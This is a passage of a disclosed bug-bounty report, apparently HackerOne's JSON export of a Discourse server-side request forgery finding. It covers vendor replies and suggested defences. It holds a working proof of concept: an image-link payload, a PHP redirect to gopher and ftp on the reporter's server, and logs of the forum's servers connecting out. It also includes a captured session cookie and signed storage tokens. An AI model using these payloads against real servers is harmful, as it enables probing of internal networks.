                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/216/6fc1730a49759e1387030151c18bd775992eb4f9/ruby_redirect.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a91a0e8b312afb0a1b6356daef828e31e68eb53b04b16c345ac908c6bca0093f", 
                    "type": "image/png", 
                    "id": 186216, 
                    "filename": "ruby_redirect.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/215/f3db2f16c0a0df29e00a3c9d0ece378f4142685b/Ruby_netcat.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1576c46944717cb0d519ab282ae46eaef124e7f7f628d105079aec2cf27568dd", 
                    "type": "image/png", 
                    "id": 186215, 
                    "filename": "Ruby_netcat.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/214/950b2cefa687af8a216f08e670ef0f112a25a707/Ruby_client_prove.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7e0e6d38839e93ac3f7d1e4def0be706ebb2214b47210879c560fc6a11f8a7e5", 
                    "type": "image/png", 
                    "id": 186214, 
                    "filename": "Ruby_client_prove.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-05-19T20:13:32.413Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T20:28:09.874Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Here is the older log with prove that ruby client was affected.( check attachemnts ). I just noticed and  found out why the Ruby client do not follow my redirect. The impact exists only if you are using unique file name each time.\n\nfor example if we once asked  link \nhttp://192.166.218.53/malicious3.php\n\nthen we need to change the name of our file on server to for example malicious4.php.\n\"http://192.166.218.53/malicious4.php\"\nRuby client is only involved if the file is uploaded for a first time (Ruby_redirect.png) file shows the screen with my log files that i just sent to my own server.\n\nThere is also other option to send the request without editing file name.\n\nEdit the post u already sent  and add to the link an empty parameter for example \n\nESTa [![](http://192.166.218.53/malicious4.php?asd)](http://192.166.218.53/malicious4.php?asd)\n\nThe screen Ruby_netcat shows the output after subimiting the changes to the posts\n\n\nlistening on [any] 1337 ...\n64.71.168.198: inverse host lookup failed: Unknown host\nconnect to [192.166.218.53] from (UNKNOWN) [64.71.168.198] 41325\nGET / HTTP/1.1\nAccept-Encoding: identity\nAccept: */*\nUser-Agent: Ruby\nConnection: close\nHost: 192.166.218.53:1337\n\n\nIf you have problem with reproduce i can show it on live screen for you.", 
            "markdown_message": "<p>Here is the older log with prove that ruby client was affected.( check attachemnts ). I just noticed and  found out why the Ruby client do not follow my redirect. The impact exists only if you are using unique file name each time.</p>\n\n<p>for example if we once asked  link <br>\n<a title=\"http://192.166.218.53/malicious3.php\" href=\"/redirect?signature=65972a013a991377870d9b9bb1d192228dff8aa1&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://192.166.218.53/malicious3.php</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>then we need to change the name of our file on server to for example malicious4.php.<br>\n&quot;<a title=\"http://192.166.218.53/malicious4.php\" href=\"/redirect?signature=79d072989698aa13467fda7aa7df9952b4c6be1e&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious4.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://192.166.218.53/malicious4.php</span><i class=\"icon-external-link\"></i></a>&quot;<br>\nRuby client is only involved if the file is uploaded for a first time (Ruby_redirect.png) file shows the screen with my log files that i just sent to my own server.</p>\n\n<p>There is also other option to send the request without editing file name.</p>\n\n<p>Edit the post u already sent  and add to the link an empty parameter for example </p>\n\n<p>ESTa <a href=\"/redirect?signature=36146a62f538cf73605dcb1cbd387ac95745c1cf&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious4.php%3Fasd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>![](http://192.166.218.53/malicious4.php?asd)</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The screen Ruby_netcat shows the output after subimiting the changes to the posts</p>\n\n<p>listening on [any] 1337 ...<br>\n64.71.168.198: inverse host lookup failed: Unknown host<br>\nconnect to [192.166.218.53] from (UNKNOWN) [64.71.168.198] 41325<br>\nGET / HTTP/1.1<br>\nAccept-Encoding: identity<br>\nAccept: <em>/</em><br>\nUser-Agent: Ruby<br>\nConnection: close<br>\nHost: 192.166.218.53:1337</p>\n\n<p>If you have problem with reproduce i can show it on live screen for you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687045, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T20:50:32.480Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T20:50:32.480Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Thanks I was able to reproduce the crawling of the FTP protocol. Looking into it.", 
            "markdown_message": "<p>Thanks I was able to reproduce the crawling of the FTP protocol. Looking into it.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687105, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:19:54.405Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:19:54.405Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Np, notice that the exploitation is a bit tricky, as if u will use the same filename as i said before the requests will be sent only via the first client, the ruby client will only send a request if the \"uploaded\" file is a new file and for a first time asked.\n\nWaiting for your response, cheers.", 
            "markdown_message": "<p>Np, notice that the exploitation is a bit tricky, as if u will use the same filename as i said before the requests will be sent only via the first client, the ruby client will only send a request if the &quot;uploaded&quot; file is a new file and for a first time asked.</p>\n\n<p>Waiting for your response, cheers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687160, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:23:20.590Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:23:20.590Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "We've fixed the ftp/gopher issue but are brainstorming how to resolve the HTTP issue properly. ", 
            "markdown_message": "<p>We&#39;ve fixed the ftp/gopher issue but are brainstorming how to resolve the HTTP issue properly. </p>\n", 
            "type": "Activities::Comment", 
            "id": 1687174, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:28:09.446Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:28:09.446Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hay, \n\nJust do like i said, check if sent message responded with response \"200\" which is a vliad, if the  malicious server will try to redirect the response will be 302 and if it will be not the \"200\" code then shoutdown the fucntion. Second check if the response is \"200\" then check if the valid request is a image by scraping the content of the response.", 
            "markdown_message": "<p>Hay, </p>\n\n<p>Just do like i said, check if sent message responded with response &quot;200&quot; which is a vliad, if the  malicious server will try to redirect the response will be 302 and if it will be not the &quot;200&quot; code then shoutdown the fucntion. Second check if the response is &quot;200&quot; then check if the valid request is a image by scraping the content of the response.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687187, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:33:02.050Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:47:59.262Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Also you can block all adress that contains a local IP: for example make a blacklist and check the \"domain\" after protocol for example:\n\nif user will submit http://127.0.0.1/panel_php?cmd=ls\n\ncheck if the part of link after protocol ://HERE/ is not on blacklist.\n\nOn blacklist should be all possibilities  that will block the request to internal resources:\n- 127.0.0.1\n- 0.0.0.0\n- localhost\n- All IP of yoiur servers and API's (including 64.71.168.198, 64.71.168.206 etc...)\n\n\nAlso you can check if the requested link have a valid content type for example create a whitelist:\n\n$extensionMap = [\n    'gif'  => 'image/gif',\n    'png'  => 'image/png',\n    'jpg'  => 'image/jpeg',\n    'jpeg' => 'image/jpeg'\n];\n\n\nYou can read an example here:\n\nhttps://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/\nhttp://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\n\n\nps. i can confirm of fixed issue with other protocol just tested.", 
            "markdown_message": "<p>Also you can block all adress that contains a local IP: for example make a blacklist and check the &quot;domain&quot; after protocol for example:</p>\n\n<p>if user will submit <a title=\"http://127.0.0.1/panel_php?cmd=ls\" href=\"/redirect?signature=3e6e3deffba53d24aafd4ed3a69f1ac7d60b0e5e&amp;url=http%3A%2F%2F127.0.0.1%2Fpanel_php%3Fcmd%3Dls\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1/panel_php?cmd=ls</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>check if the part of link after protocol ://HERE/ is not on blacklist.</p>\n\n<p>On blacklist should be all possibilities  that will block the request to internal resources:</p>\n\n<ul>\n<li>127.0.0.1</li>\n<li>0.0.0.0</li>\n<li>localhost</li>\n<li>All IP of yoiur servers and API&#39;s (including 64.71.168.198, 64.71.168.206 etc...)</li>\n</ul>\n\n<p>Also you can check if the requested link have a valid content type for example create a whitelist:</p>\n\n<p>$extensionMap = [<br>\n    &#39;gif&#39;  =&gt; &#39;image/gif&#39;,<br>\n    &#39;png&#39;  =&gt; &#39;image/png&#39;,<br>\n    &#39;jpg&#39;  =&gt; &#39;image/jpeg&#39;,<br>\n    &#39;jpeg&#39; =&gt; &#39;image/jpeg&#39;<br>\n];</p>\n\n<p>You can read an example here:</p>\n\n<p><a title=\"https://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/\" href=\"/redirect?signature=dcaa58209dd355298746a02d54ee758ce63a18ab&amp;url=https%3A%2F%2Fwhitton.io%2Farticles%2Fsafecurl-ssrf-protection-and-a-capture-the-bitcoins%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\" href=\"/redirect?signature=c6e37d15cc09e31b169fdfd88215efbc19663a33&amp;url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F35896093%2Fhow-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>ps. i can confirm of fixed issue with other protocol just tested.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687199, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:50:34.237Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:50:34.237Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Low", 
                "old_severity": "Medium"
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1687222, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-05-19T21:51:10.415Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:51:10.415Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "bonus_amount": "0.0", 
            "bounty_amount": "64.0", 
            "collaborator": {
                "username": "afine-team", 
                "url": "/afine-team"
            }, 
            "message": "thanks, we don't consider this much of an exploit, but good to patch on principle.", 
            "markdown_message": "<p>thanks, we don&#39;t consider this much of an exploit, but good to patch on principle.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1687223, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "afine-team", 
                "url": "/afine-team"
            }, 
            "created_at": "2017-05-19T21:51:27.054Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:51:27.054Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1687225, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:54:41.580Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:54:41.580Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "The impact in our opinion is  more dangerous as this impact internal resources. you can for example check how much other programs pay for this kind of issue, but thanks for the bounty...\n\nCan we make the report public after with only summary? as there is my server IP address information.\n\nCheers.", 
            "markdown_message": "<p>The impact in our opinion is  more dangerous as this impact internal resources. you can for example check how much other programs pay for this kind of issue, but thanks for the bounty...</p>\n\n<p>Can we make the report public after with only summary? as there is my server IP address information.</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687229, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T21:55:49.158Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T21:55:49.158Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "first_to_agree": true, 
            "message": "Before disclosure  please remove all sensitive infrmation or disclosure only the summary.. \n\nRegards afine.pl team", 
            "markdown_message": "<p>Before disclosure  please remove all sensitive infrmation or disclosure only the summary.. </p>\n\n<p>Regards afine.pl team</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1687230, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-18T21:55:53.089Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-18T21:55:53.089Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1764218, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "afine-team", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/afine-team", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/154/398/d9f77156a3a3755be3b3c996f509d6c8a1ddd95a_small.png?1490796800"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -46312870.74015033, 
    "disclosed_at": "2017-06-18T21:55:53.062Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/228377", 
    "created_at": "2017-05-14T21:05:29.209Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>-Short description</p>\n\n<p>Private message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).<br>\nread more at:<br>\n<a title=\"https://cwe.mitre.org/data/definitions/918.html\" href=\"/redirect?signature=e637acd41f9081343c78c507a94298f0f95551dc&amp;url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F918.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cwe.mitre.org/data/definitions/918.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<ol>\n<li>Load <a title=\"http://try.discourse.org\" href=\"/redirect?signature=933eb0d136984432caa09984adce615653f98cd5&amp;url=http%3A%2F%2Ftry.discourse.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://try.discourse.org</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Go to new message composer</li>\n<li><p>Set the receiver, topic <br>\n4 set the message content<br>\nTEST  <a href=\"/redirect?signature=65972a013a991377870d9b9bb1d192228dff8aa1&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>![](http://192.166.218.53/malicious3.php)</span><i class=\"icon-external-link\"></i></a></p></li>\n<li><p>Set the malicious3.php file on your remote server to:</p></li>\n</ol>\n\n<p>&lt;?php<br>\n        header(&#39;Location: gopher://192.166.218.53:80/test123&#39;);<br>\n?&gt;</p>\n\n<ol>\n<li><p>Send the private message.</p></li>\n<li><p>Check your remote server, in my case &quot;192.166.218.53&quot; web logs file (access.log)<br>\nOUTPUT :</p></li>\n</ol>\n\n<p>64.71.168.198 - - [14/May/2017:16:38:04 -0400] &quot;HEAD /malicious3.php HTTP/1.1&quot; 302 187 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;<br>\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] &quot;GET /malicious3.php HTTP/1.1&quot; 302 225 &quot;-&quot; &quot;Ruby&quot;<br>\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] &quot;HEAD /test123 HTTP/1.1&quot; 404 140 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;</p>\n\n<hr>\n\n<ul>\n<li> Request for FTP connection</li>\n<li>Load <a title=\"http://try.discourse.org\" href=\"/redirect?signature=933eb0d136984432caa09984adce615653f98cd5&amp;url=http%3A%2F%2Ftry.discourse.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://try.discourse.org</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Go to new message composer</li>\n<li>Set the receiver, topic</li>\n<li>set the message content\nTESTs  <a href=\"/redirect?signature=65972a013a991377870d9b9bb1d192228dff8aa1&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>![](http://192.166.218.53/malicious3.php)</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ul>\n\n<ol>\n<li>Set the malicious3.php file on your remote server to:</li>\n</ol>\n\n<p>&lt;?php<br>\n        header(&#39;Location: <a title=\"ftp://192.166.218.53/&#39;\" href=\"/redirect?signature=d5be2c1ccbd2b883a0aeb938662c310771a4e0e5&amp;url=ftp%3A%2F%2F192.166.218.53%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://192.166.218.53/&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt;</p>\n\n<ol>\n<li><p>Send the private message.</p></li>\n<li><p>Check your remote server, in my case &quot;192.166.218.53&quot; ftp  logs file. (vsftp.log).<br>\nOUTPUT :<br>\nSun May 14 15:29:40 2017 [pid 18354] CONNECT: Client &quot;::ffff:64.71.168.198&quot;</p></li>\n</ol>\n\n<hr>\n\n<ul>\n<li>Here is the burp suite request:</li>\n</ul>\n\n<p>POST /posts HTTP/1.1<br>\nHost: try.discourse.org<br>\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0<br>\nAccept: application/json, text/javascript, <em>/</em>; q=0.01<br>\nAccept-Language: en-US,en;q=0.5<br>\nX-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==<br>\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8<br>\nDiscourse-Visible: true<br>\nX-Requested-With: XMLHttpRequest<br>\nReferer: <a title=\"https://try.discourse.org/t/adsadas/835/7\" href=\"/redirect?signature=251bc864deea6ff1a1d5e0b2050878093a53b367&amp;url=https%3A%2F%2Ftry.discourse.org%2Ft%2Fadsadas%2F835%2F7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org/t/adsadas/835/7</span><i class=\"icon-external-link\"></i></a><br>\nContent-Length: 437<br>\nCookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; 